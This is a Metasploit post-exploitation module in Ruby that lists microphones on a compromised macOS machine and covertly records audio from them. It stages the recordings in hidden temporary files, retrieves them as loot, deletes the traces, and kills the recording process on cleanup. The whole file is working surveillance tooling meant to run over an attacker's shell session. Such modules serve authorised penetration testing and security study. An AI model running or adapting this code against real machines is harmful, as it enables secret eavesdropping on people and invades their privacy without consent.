##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'shellwords'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::OSX::RubyDL

  POLL_TIMEOUT = 120

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OSX Manage Record Microphone',
      'Description'   => %q{
          This module will allow the user to detect (with the LIST action) and
          capture (with the RECORD action) audio inputs on a remote OSX machine.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev'],
      'Platform'      => [ 'osx'],
      'SessionTypes'  => [ 'shell' ],
      'Actions'       => [
        [ 'LIST',     { 'Description' => 'Show a list of microphones' } ],
        [ 'RECORD', { 'Description' => 'Record from a selected audio input' } ]
      ],
      'DefaultAction' => 'LIST'
    ))

    register_options(
      [
        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
        OptString.new('TMP_FILE',
          [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
        ),
        OptString.new('AUDIO_COMPRESSION',
          [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']
        ),
        OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),
        OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])
      ])
  end


  def run
    fail_with(Failure::BadConfig, "Invalid session ID selected.") if client.nil?
    fail_with(Failure::BadConfig, "Invalid action") if action.nil?

    num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
    ruby_cmd = osx_capture_media(
      :action => action.name.downcase,
      :snap_filetype => '',
      :audio_enabled => true,
      :video_enabled => false,
      :num_chunks => num_chunks,
      :chunk_len => datastore['SYNC_WAIT'],
      :video_device => 0,
      :audio_device => datastore['MIC_INDEX'],
      :snap_jpg_compression => 0,
      :video_compression => '',
      :audio_compression => datastore['AUDIO_COMPRESSION'],
      :record_file => tmp_file,
      :snap_file => tmp_file
    )

    output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
    if action.name =~ /list/i
      print_good output
    elsif action.name =~ /record/i
      @pid = output.to_i
      print_status "Running record service with PID #{@pid}"
      (0...num_chunks).each do |i|
        # wait SYNC_WAIT seconds
        print_status "Waiting for #{datastore['SYNC_WAIT'].to_i} seconds"
        Rex.sleep(datastore['SYNC_WAIT'])
        # start reading for file
        begin
          ::Timeout.timeout(poll_timeout) do
            while true
              if File.exist?(tmp_file)
                # read file
                contents = File.read(tmp_file)
                # delete file
                rm_f(tmp_file)
                # roll filename
                base = File.basename(tmp_file, '.*') # returns it with no extension
                num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
                ext = File.extname(tmp_file) || 'o'
                tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
                # store contents in file
                title = "OSX Mic Recording "+i.to_s
                f = store_loot(title, "audio/quicktime", session, contents,
                  "osx_mic_rec#{i}.qt", title)
                print_good "Record file captured and saved to #{f}"
                print_status "Rolling record file. "
                break
              else
                Rex.sleep(0.3)
              end
            end
          end
        rescue ::Timeout::Error
          fail_with(Failure::TimeoutExpired, "Client did not respond to file request after #{poll_timeout}s, exiting.")
        end
      end
    end
  end

  def cleanup
    return unless @cleaning_up.nil?
    @cleaning_up = true

    if action.name =~ /record/i and not @pid.nil?
      print_status("Killing record service...")
      cmd_exec("/bin/kill -9 #{@pid}")
    end
  end

  private

  def poll_timeout
    POLL_TIMEOUT
  end
end
